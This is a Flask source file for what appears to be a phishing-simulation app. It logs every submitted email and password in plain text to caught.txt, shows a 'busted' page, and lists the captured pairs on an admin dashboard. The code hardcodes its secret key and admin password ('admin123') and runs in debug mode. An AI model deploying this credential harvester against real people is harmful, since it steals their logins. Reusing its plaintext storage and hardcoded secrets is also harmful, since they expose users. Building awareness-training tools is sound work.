from flask import Flask, render_template, request, session, redirect, url_for

app = Flask(__name__)
app.secret_key = 'sentrify-secret-2024'

ADMIN_PASSWORD = 'admin123'

@app.route('/')
def home():
    return render_template('index.html')

@app.route('/capture', methods=['POST'])
def capture():
    email = request.form.get('email')
    password = request.form.get('password')

    with open('caught.txt', 'a') as f:
        f.write(f"{email},{password}\n")

    return render_template('busted.html')

@app.route('/admin', methods=['GET', 'POST'])
def admin_login():
    if request.method == 'POST':
        if request.form.get('password') == ADMIN_PASSWORD:
            session['logged_in'] = True
            return redirect(url_for('dashboard'))
        else:
            return render_template('admin_login.html', error='Wrong password')
    return render_template('admin_login.html', error=None)

@app.route('/dashboard')
def dashboard():
    if not session.get('logged_in'):
        return redirect(url_for('admin_login'))

    results = []
    try:
        with open('caught.txt', 'r') as f:
            for line in f:
                parts = line.strip().split(',')
                if len(parts) == 2:
                    results.append({
                        'email': parts[0],
                        'password': parts[1]
                    })
    except FileNotFoundError:
        pass

    total_caught = len(results)
    return render_template('dashboard.html', results=results, total=total_caught)

app.jinja_env.globals['enumerate'] = enumerate
app.run(debug=True)
